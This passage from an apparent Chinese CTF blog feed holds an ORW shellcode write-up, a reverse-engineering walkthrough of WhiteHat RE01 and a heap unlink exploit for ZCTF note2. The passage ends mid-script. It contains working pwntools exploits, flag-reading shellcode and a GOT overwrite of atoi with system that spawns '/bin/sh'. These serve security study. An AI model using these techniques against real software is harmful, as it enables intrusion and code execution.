href="#关于系统调用" class="headerlink" title="关于系统调用"></a>关于系统调用</h2><p>对于32位来说：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统调用号：EAX</span><br><span class="line"></span><br><span class="line">参数：EBX、ECX、EDX、ESI、EDI、EBP</span><br><span class="line"></span><br><span class="line">返回值：EAX</span><br></pre></td></tr></table></figure><p>对于64位来说：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">系统调用号：RAX</span><br><span class="line"></span><br><span class="line">参数：RDI、RSI、RDX、R10、R8、R9</span><br><span class="line"></span><br><span class="line">返回值：RAX</span><br></pre></td></tr></table></figure><p>对于我们的ORW（32位）来说：</p><table><thead><tr><th>系统调用号:eax</th><th>Name</th><th>args1:ebx</th><th>args2:ecx</th><th>args3:edx</th></tr></thead><tbody><tr><td>3</td><td>sys_read</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>4</td><td>sys_write</td><td>unsigned int fd</td><td>char *buf</td><td>size_t count</td></tr><tr><td>5</td><td>sys_open</td><td>char __user *filename</td><td>int flags</td><td>int mode</td></tr></tbody></table><h2 id="编写shellcode"><a href="#编写shellcode" class="headerlink" title="编写shellcode"></a>编写shellcode</h2><p>首先我们需要open，由于BUUOJ上面存放flag的文件名就叫flag，这也就为我们open提供了便利。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//open(flag,0,0)</span><br><span class="line">mopen = &apos;&apos;&apos;</span><br><span class="line">mov eax,5;</span><br><span class="line">xor ecx,ecx;</span><br><span class="line">xor edx,edx;</span><br><span class="line">push 0;                \x00 用于截断字符串(flag)</span><br><span class="line">push 0x67616C66;       flag的小端序写法</span><br><span class="line">mov ebx,esp;           esp指向字符串&quot;flag\0&quot;</span><br><span class="line">int 0x80;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">//read(fd,esp,0x50)    fd即open的返回值，存在eax中。</span><br><span class="line">mread = &apos;&apos;&apos;</span><br><span class="line">mov ecx,ebx;            esp处用作缓冲区读取flag</span><br><span class="line">mov ebx,eax;            eax为open的返回值，即读取到的文件的file ID(如果读取失败则返回-1)</span><br><span class="line">mov eax,3;</span><br><span class="line">mov edx,0x50;</span><br><span class="line">int 0x80;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">//write(1,esp,0x50)</span><br><span class="line">mwrite = &apos;&apos;&apos;</span><br><span class="line">mov eax,4;</span><br><span class="line">mov ebx,1;              文件描述符 stdout</span><br><span class="line">mov edx,0x50;</span><br><span class="line">int 0x8</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure><p>这段汇编应该挺容易理解的，然后就没啥难点了…</p><p>同样还可以利用pwntools的shellcraft来构造，需要指明<code>context.arch</code>，32位就i386,64位就amd64</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sh = shellcraft.pushstr(<span class="string">'flag'</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_open'</span>,<span class="string">"esp"</span>,<span class="number">0</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_read'</span>,<span class="string">'eax'</span>,<span class="string">'esp'</span>,<span class="number">0x50</span>)</span><br><span class="line">sh += shellcraft.syscall(<span class="string">'SYS_write'</span>,<span class="number">1</span>,<span class="string">'esp'</span>,<span class="number">0x50</span>)</span><br><span class="line">sh = asm(sh)</span><br></pre></td></tr></table></figure><h1 id="0x03完整EXP"><a href="#0x03完整EXP" class="headerlink" title="0x03完整EXP"></a>0x03完整EXP</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line">c = process(<span class="string">'./orw'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',26916)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c,'b*0x804858A')</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Give my your shellcode:'</span>)</span><br><span class="line"></span><br><span class="line">mopen = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,5;</span></span><br><span class="line"><span class="string">xor ecx,ecx;</span></span><br><span class="line"><span class="string">xor edx,edx;</span></span><br><span class="line"><span class="string">push 0;</span></span><br><span class="line"><span class="string">push 0x67616C66;</span></span><br><span class="line"><span class="string">mov ebx,esp;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">mread = <span class="string">'''</span></span><br><span class="line"><span class="string">mov ecx,ebx;</span></span><br><span class="line"><span class="string">mov ebx,eax;</span></span><br><span class="line"><span class="string">mov eax,3;</span></span><br><span class="line"><span class="string">mov edx,0x50;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">mwrite = <span class="string">'''</span></span><br><span class="line"><span class="string">mov eax,4;</span></span><br><span class="line"><span class="string">mov ebx,1;</span></span><br><span class="line"><span class="string">mov edx,0x50;</span></span><br><span class="line"><span class="string">int 0x80;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = asm(mopen) + asm(mread) + asm(mwrite)</span><br><span class="line"><span class="keyword">print</span> hex(len(sh))</span><br><span class="line">c.sendline(sh)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>这段EXP在BUUOJ上是可以打通的，如果想在pwnable.tw打通，需要修改一下 open 那块的汇编，应该向ebx传入flag文件的绝对路径。</p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>SKSEC Summer Training</title>
    <url>/2019/07/28/SKSEC-Summer-Training/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/22984.jpg" alt></p><a id="more"></a><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27907396&auto=1&height=66"></iframe># 0x01 RE-WhiteHat #<h2 id="独立完成的部分"><a href="#独立完成的部分" class="headerlink" title="独立完成的部分"></a>独立完成的部分</h2><ul><li>题目下载地址如下:</li></ul><p><a href="https://github.com/Vlad-tri/CTFs-WriteUps/blob/master/WhiteHat%20GrandPrix%20Quals%202018/RE01/WhiteHat.zip" title="题目下载地址" target="_blank" rel="noopener">传送门</a></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728214708.png" alt></p><ul><li><p>打开以后是一个提示输入Key的框框,随便输点然后点Check,并没有什么反应。</p></li><li><p>查壳,无壳。</p></li><li><p>拖入OD调试, 尝试在点击Check以后断住程序,然后再想办法搞到Flag 但是…断不住。</p></li><li><p>拖入IDA, 一大堆<code>sub_xxxxx</code>看得头都大了一圈。大致分辨出这应该是个MFC程序。</p></li><li><p><code>start</code>函数就这么一点。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728215228.png" alt></p><ul><li><code>__security_init_cookie</code>函数也没啥重要内容。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728215241.png" alt></p><ul><li>start函数返回的这个函数也没啥重要内容…</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728215437.png" alt></p><ul><li><p>现在的难点变成了如何定位到关键函数。</p></li><li><p>手动挨个查看那一大堆<code>sub_xxxx</code>太费时间了, <code>Shift + F12</code>查看一下字符串, 然后发现了可疑字符串和两个可疑文件。</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728215843.png" alt></p><ul><li>来到这些字符串对应的函数的位置。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728220052.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728220107.png" alt></p><ul><li>大概看懂了一部分吧,然后就不知道该干嘛了。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/936f34efce1b9d16ad8611e5fadeb48f8d54641f.jpg" alt></p><h2 id="借助WP完成的部分"><a href="#借助WP完成的部分" class="headerlink" title="借助WP完成的部分"></a>借助WP完成的部分</h2><ul><li>借助WP 了解到了一款软件 <code>Resource Hacker</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728220422.png" alt></p><ul><li>关于这款软件的一些用法,参照</li></ul><p><a href="http://www.seotest.cn/jiaocheng/7636.html" target="_blank" rel="noopener">http://www.seotest.cn/jiaocheng/7636.html</a></p><ul><li>这款软件好像对处理GUI程序挺有用的。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728230839.png" alt></p><ul><li>根据IDA中这一块,RecourseHacker中141标号即2.exe这个文件</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728231001.png" alt></p><ul><li>142标号即b.dll这个文件, 但是却是一堆乱码。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728231039.png" alt></p><ul><li><p>用这个软件提取出来这两个文件。</p></li><li><p>由下面这一块 , 借助WP试出来a1 = 0x32</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190728231237.png" alt></p><ul><li>第一个字符串得到:<code>sc create Pt type= filesys binPath=</code></li><li>第二个字符串得到:<code>sc start Pt</code></li></ul><h3 id="Q1-but这俩字符串有啥用？"><a href="#Q1-but这俩字符串有啥用？" class="headerlink" title="Q1:but这俩字符串有啥用？"></a>Q1:but这俩字符串有啥用？</h3><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/4226D36F0E7C7FE53C7245F53363E8CF.gif" alt></p><ul><li>根据WP(菜是原罪) 分析2.exe这个文件。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729010141.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729010159.png" alt></p><ul><li>程序把b.dll的内容与v12进行异或,然后写入Src(flag.dll)中。</li></ul><h3 id="Q2-是否能通过直接运行2-exe来完成上述步骤"><a href="#Q2-是否能通过直接运行2-exe来完成上述步骤" class="headerlink" title="Q2:是否能通过直接运行2.exe来完成上述步骤?"></a>Q2:是否能通过直接运行2.exe来完成上述步骤?</h3><ul><li>那么就按照程序的步骤手动来呗？ 但是又遇到了新麻烦。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729010546.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729010500.png" alt></p><ul><li>b.dll里面的内容长度是3436,但是 用python还有C进行文件读操作读出来的长度都只有107,读到9M#后就不再读下去了,导致后续的异或操作无法正常进行。</li></ul><h3 id="Q3-为什么会出现只能read-一部分的这种情况"><a href="#Q3-为什么会出现只能read-一部分的这种情况" class="headerlink" title="Q3:为什么会出现只能read()一部分的这种情况?"></a>Q3:为什么会出现只能read()一部分的这种情况?</h3><ul><li>无奈之下只能通过010Editor提取16进制数据了</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729010755.png" alt></p><ul><li>然后写了个小程序手动完成2.exe执行的操作</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line">f = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\b'</span>,<span class="string">'r'</span>)<span class="comment">#b里面是从b.dll提取出来的16进制数据</span></span><br><span class="line">buffer = f.read()</span><br><span class="line">L = buffer.replace(<span class="string">'\n'</span>,<span class="string">' '</span>).split(<span class="string">' '</span>)</span><br><span class="line">L.pop()<span class="comment">#消除最后因为替换\n为空格而带来的多余的一个空格</span></span><br><span class="line"></span><br><span class="line">ff = open(<span class="string">'C:\\Users\\LiuLian\\Desktop\\flag.dll'</span>,<span class="string">'wb'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    x = chr(int(i,<span class="number">16</span>)^<span class="number">0x36</span>)</span><br><span class="line">    ff.write(x)</span><br><span class="line">f.close()</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><ul><li>运行得到flag.dll</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190729011449.png" alt></p><ul><li>查看文件头发现是个png文件, 修改拓展名为png得到flag的图片。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/flag.png" alt></p>]]></content>
      <categories>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>[Unlink]2016-ZCTF-note2</title>
    <url>/2020/02/03/Unlink-2016-ZCTF-note2/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/bg14.png" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00 前言</h1><ul><li><p>依然是<code>CTF-WIKI</code>上关于<code>Unlink</code>的一道例题。</p></li><li><p>题目下载链接:<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2" target="_blank" rel="noopener">下载链接</a></p></li><li><p>参考链接:</p></li></ul><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><p><a href="https://www.jianshu.com/p/b833a2e4275f" target="_blank" rel="noopener">简书</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li><p>程序提供了5个选项。</p></li><li><p><code>New note</code>，创建note，每个note的size和chunk都会存在bss段的对应位置。</p></li><li><p><code>Show note</code> 能输出note的内容。</p></li><li><p><code>Edit note</code>提供了<code>overwrite和append</code>两种方式。</p></li><li><p><code>Delete note</code>能执行正常的free。</p></li><li><p><code>Exit</code> 退出程序</p></li></ul><h2 id="漏洞点1"><a href="#漏洞点1" class="headerlink" title="漏洞点1"></a>漏洞点1</h2><ul><li>漏洞点1: 在<code>New note</code>中，我们的size采用的是<code>unsigned int</code>类型，但是在我们的读入函数<code>MyRead((__int64)ptr, size, 10);</code></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">MyRead</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>也就是在for循环的终止条件中，i 是与 <code>a2(也就是我们的size)-1</code>进行比较。 假设我们的<code>size</code>设为0，由于<code>size</code>是<code>unsigned int</code>类型，那么<code>size-1</code>将是<code>4294967295</code>这么大，我们就可以输入非常多的内容从而造成堆溢出了。</li><li>由于glibc的分配内存机制，当我们的<code>size = 0</code>时，实际会分配给我们0x20的内存块。</li></ul><h2 id="漏洞点2"><a href="#漏洞点2" class="headerlink" title="漏洞点2"></a>漏洞点2</h2><ul><li>漏洞点2: 在<code>Edit note</code>中，程序只free掉了v8，并没有置<code>NULL</code>。</li></ul><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><ul><li><p>本文利用的是漏洞点1， 貌似也可以利用漏洞点2？还请大佬们指教。</p></li><li><p>创建三个chunk，大小分别为<code>0x80,0x0,0x80</code>,在<code>chunk0</code>中伪造chunk，通过<code>chunk1</code>的漏洞，修改掉<code>chunk2</code>的<code>prev_size和size里的prev_inuse标志位</code>，free掉<code>chunk2</code>，触发unlink，想办法泄露出某个函数的地址，然后推算出<code>libcbase</code>，从而得到<code>system</code>地址，将<code>atoi</code>覆盖成<code>system</code>，执行<code>system(&#39;/bin/sh)</code></p></li></ul><h1 id="0x02-Let’s-do-it"><a href="#0x02-Let’s-do-it" class="headerlink" title="0x02 Let’s do it!"></a>0x02 Let’s do it!</h1><h2 id="前期模板"><a href="#前期模板" class="headerlink" title="前期模板"></a>前期模板</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Input the note content:'</span>)</span><br><span class="line">    c.sendline(str(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, choice, cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    c.sendline(str(id))</span><br><span class="line">    c.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    c.sendline(str(choice))</span><br><span class="line">    c.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">c.sendline(<span class="string">'liulian'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'address:'</span>)</span><br><span class="line">c.sendline(<span class="string">'aaaa'</span>)</span><br></pre></td></tr></table></figure><h2 id="创建note，并伪造chunk"><a href="#创建note，并伪造chunk" class="headerlink" title="创建note，并伪造chunk"></a>创建note，并伪造chunk</h2><ul><li><code>CTF-WIKI</code>中，<code>伪造chunk里的内容</code>有点绕，不太好理解。</li><li>本文的伪造chunk和<code>CTF-WIKI</code>中的不一样，相对来说更好理解一些吧，但是对大佬来说估计都一样..</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">head = <span class="number">0x602120</span></span><br><span class="line">fakefd = head - <span class="number">0x18</span></span><br><span class="line">fakebk = head - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">8</span> <span class="comment">#padding</span></span><br><span class="line">content += p64(<span class="number">0xa1</span>)<span class="comment">#fakechunk's size</span></span><br><span class="line">content += p64(fakefd)</span><br><span class="line">content += p64(fakebk)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br></pre></td></tr></table></figure><ul><li>对于伪造chunk的<code>size</code>为什么是<code>0xa1</code>?</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200205011308.png" alt></p><ul><li><p>当它的<code>size</code>正好等于<code>0xa1</code>的时候,这个伪造<code>chunk</code>正好包含住<code>chunk1</code>且紧挨着<code>chunk2</code>。</p></li><li><p>当我们<code>free</code>掉<code>chunk2</code>，程序会根据<code>chunk2</code>的<code>presize</code>来获得指向前一块<code>chunk</code>的指针。</p></li><li><p>因此下一步就要想办法修改<code>chunk2</code>的<code>presize</code>和<code>inuse标志位</code>。</p></li></ul><h2 id="修改chunk2的presize和inuse标志位-并执行unlink"><a href="#修改chunk2的presize和inuse标志位-并执行unlink" class="headerlink" title="修改chunk2的presize和inuse标志位 并执行unlink"></a>修改chunk2的presize和inuse标志位 并执行unlink</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span>*<span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ul><li><p>当我们<code>delete(1)</code>的时候，由于该<code>chunk</code>属于<code>fastbin</code>，所以下次在申请的时候仍然会申请到该<code>chunk</code>，然后通过漏洞覆盖掉<code>chunk2</code>的<code>prevsize</code>和<code>inuse位</code></p></li><li><p>随后当我们<code>delete(2)</code></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p是指向free掉的chunk2的指针</span><br><span class="line"></span><br><span class="line">检查p指向chunk的size字段的pre_inuse位，是否为0（也就是检查当前chunk的前一块chunk是否是free的，如果是则进入向前合并的流程)</span><br><span class="line"></span><br><span class="line">获取前一块chunk的size，并加到size中（以此来表示size大小上已经合并）</span><br><span class="line"></span><br><span class="line">根据当前chunk的presize来获得指向前一块chunk的指针</span><br><span class="line"></span><br><span class="line">将这个指针传入unlink的宏（也就是让free掉的chunk的前一块chunk进入到unlink流程）</span><br></pre></td></tr></table></figure><ul><li>那么伪造chunk就会执行unlink，效果就是让前面的<code>*(head) = head - 0x18</code></li></ul><h2 id="打印出atoi的地址，并计算libcbase"><a href="#打印出atoi的地址，并计算libcbase" class="headerlink" title="打印出atoi的地址，并计算libcbase"></a>打印出atoi的地址，并计算libcbase</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'is '</span>)</span><br><span class="line">atoi_addr = c.recvuntil(<span class="string">'\n'</span>, drop=<span class="literal">True</span>)</span><br><span class="line">atoi_addr = u64(atoi_addr.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'atoi_addr = '</span> + hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libcbase = atoi_addr - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">system = libcbase + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'system = '</span> + hex(system))</span><br></pre></td></tr></table></figure><h2 id="将atoi变成system，并getshell"><a href="#将atoi变成system，并getshell" class="headerlink" title="将atoi变成system，并getshell"></a>将atoi变成system，并getshell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-完整exp"><a href="#0x03-完整exp" class="headerlink" title="0x03 完整exp"></a>0x03 完整exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./note2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note2'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'(less than 128)'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Input the note content:'</span>)</span><br><span class="line">    c.sendline(str(cont))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id, choice, cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'note:'</span>)</span><br><span class="line">    c.sendline(str(id))</span><br><span class="line">    c.recvuntil(<span class="string">'2.append]'</span>)</span><br><span class="line">    c.sendline(str(choice))</span><br><span class="line">    c.sendline(cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">c.sendline(<span class="string">'liulian'</span>)</span><br><span class="line">c.recvuntil(<span class="string">'address:'</span>)</span><br><span class="line">c.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">head = <span class="number">0x602120</span></span><br><span class="line">fakefd = head - <span class="number">0x18</span></span><br><span class="line">fakebk = head - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span> * <span class="number">8</span> <span class="comment">#padding</span></span><br><span class="line">content += p64(<span class="number">0xa1</span>)<span class="comment">#fakechunk's size</span></span><br><span class="line">content += p64(fakefd)</span><br><span class="line">content += p64(fakebk)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,content)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span>*<span class="number">16</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,content)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line">content = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,content)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span 